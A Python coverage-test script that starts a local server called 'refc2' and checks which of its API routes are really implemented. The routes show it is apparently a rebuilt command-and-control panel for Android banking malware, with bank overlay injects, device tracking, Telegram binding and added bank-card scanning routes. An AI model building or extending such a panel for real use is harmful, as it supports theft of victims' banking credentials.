#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""API 面覆盖度量：逐条打真实请求，统计 implemented / contract_only / 其它
判据：501=contract_only；401=鉴权门（需带 token 重试）；405=方法不符（换方法）；200/4xx业务=真实现
输出：COVERAGE.json 与本屏摘要（退出码 0 = 覆盖率 >= 95%）
"""
import json, os, random, subprocess, sys, time, urllib.error, urllib.request

HOST, PORT = '127.0.0.1', 8803
BASE = 'http://%s:%d' % (HOST, PORT)
HERE = os.path.dirname(os.path.abspath(__file__))
USER, PASS = 'admin', 'cov-' + ''.join(random.choice('abcdef0123456789') for _ in range(6))
OUT = os.path.join(HERE, 'COVERAGE.json')


def call(path, method, body=None, token=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method,
                                 headers={'Content-Type': 'application/json'})
    if token:
        req.add_header('Authorization', 'Bearer ' + token)
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read(2000).decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read(500).decode('utf-8', 'replace')
    except Exception as e:
        return 0, str(e)[:80]


def main():
    env = dict(os.environ, REFC2_USER=USER, REFC2_PASS=PASS)
    p = subprocess.Popen([sys.executable, os.path.join(HERE, 'server', 'refc2.py'),
                          '--host', HOST, '--port', str(PORT)],
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
    rows = []
    try:
        tok = None
        for _ in range(60):
            try:
                st, b = call('/api/health', 'GET')
                if st == 200:
                    break
            except Exception:
                time.sleep(0.25)
        st, b = call('/api/login', 'POST', {'username': USER, 'password': PASS})
        tok = json.loads(b)['token']
        st, b = call('/api/health', 'GET')
        total = json.loads(b)['routes']

        # 从契约清单取出全部主通道路由
        surf = json.loads(open(os.path.join(HERE, 'contracts', 'api_surface.json'), encoding='utf-8').read())
        paths = [r['path'] for r in surf['primary_panel']['routes']]
        paths += ['/api/inject-settings/html', '/api/inject-settings/logo', '/api/inject-render',
                  '/api/tg-bind', '/api/tg-bind-verify', '/api/tg-set', '/api/tg-unbind',
                  '/api/Captcha.php', '/api/EaodLogin.php', '/api/EaodBankInject.php',
                  '/ws/dashboard', '/api/hd/ws', '/api/sl/ws', '/api/ut/ws', '/api/adb-tree/ws',
                  '/api/device-inject-track/inject', '/api/device-inject-track/reset',
                  '/api/device-inject-track/skip', '/api/wallpaper/refdev0000000001']
        absent = {'/api/cmd', '/api/build2'}
        # 我方新增（目标无此路由）与必然 401 的认证端点：单列，不算缺口
        extra_added = {'/api/bank-cards', '/api/bank-card-scan'}
        auth_ok_401 = {'/api/login', '/ws/dashboard'}
        seen, impl, stub, other = set(), 0, 0, []
        for raw in paths:
            norm = raw.split('/$')[0].split('{')[0].rstrip('/') or '/'
            if norm in seen:
                continue
            seen.add(norm)
            best = None
            for mm in ('GET', 'POST', 'PUT'):
                st, b = call(norm, mm, {} if mm in ('POST', 'PUT') else None, tok)
                if st in (405,):
                    continue
                best = (st, b, mm)
                break
            if best is None:
                other.append((norm, 'no-method', 405))
                continue
            st, b, m = best
            if st == 501:
                stub += 1
                rows.append(('contract_only', norm, m, st))
            elif norm in absent:
                if st == 404:
                    rows.append(('absent_in_target(404=符合目标行为)', norm, m, st))
                else:
                    other.append((norm, m, st))
                    rows.append(('other', norm, m, st))
            elif norm in extra_added:
                impl += 1
                rows.append(('implemented(我方新增,目标无此路由)', norm, m, st))
            elif norm in auth_ok_401 and st == 401:
                impl += 1
                rows.append(('implemented(空凭据/无票 401=正确行为)', norm, m, st))
            elif norm.endswith('/ws') and st in (401, 426, 400):
                impl += 1
                rows.append(('implemented(WS 需票据)', norm, m, st))
            elif norm == '/api/EaodLogin.php':
                # 该端点空凭据本就该 401（正确行为），所以不能只看空体探测的结果 ——
                # 追加一次**带正确凭据**的登录，必须 200 才算真实现（见 F-74 附带）
                st2, _b2 = call(norm, 'POST',
                                {'usrname': USER, 'password': PASS, 'captcha': '0000'})
                if st2 == 200:
                    impl += 1
                    rows.append(('implemented(带正确凭据 200；空凭据 %d=正确行为)' % st, norm, m, st))
                else:
                    other.append((norm, m, st2))
                    rows.append(('other', norm, m, st2))
            elif st in (200, 201, 400, 404, 409, 422):
                impl += 1
                rows.append(('implemented', norm, m, st))
            else:
                other.append((norm, m, st))
                rows.append(('other', norm, m, st))
        tot = impl + stub + len(other)
        pct = 100.0 * impl / tot if tot else 0
        lines = ['# API 面覆盖度量（自动生成）', '',
                 '生成时间 %s' % time.strftime('%Y-%m-%d %H:%M:%S'),
                 '',
                 '- 已挂载路由（服务端自报）：**%d**' % total,
                 '- 本轮逐条实测：**%d** 条（含我方新增 %d 条、目标无此路由 %d 条）'
                 % (tot, len(extra_added), len(absent)),
                 '- 真实现：**%d**（%.1f%%）' % (impl, pct),
                 '- 契约占位（501）：**%d**' % stub,
                 '- 其它：**%d**' % len(other),
                 '', '| 判定 | 路由 | 方法 | 状态 |', '|---|---|---|---|']
        for kind, path, m, st in rows:
            lines.append('| %s | `%s` | %s | %s |' % (kind, path, m, st))
        open(OUT, 'w', encoding='utf-8').write('\n'.join(lines))
        print('\n'.join(lines[:10]))
        print("\n占位中仍需补的 %d 条：" % stub)
        for k, rp, rm, rs in rows:
            if k == 'contract_only':
                print("   %s" % rp)
        print("\n落盘 -> %s" % OUT)
        return 0 if pct >= 95 else 1
    finally:
        p.terminate()


if __name__ == '__main__':
    sys.exit(main())
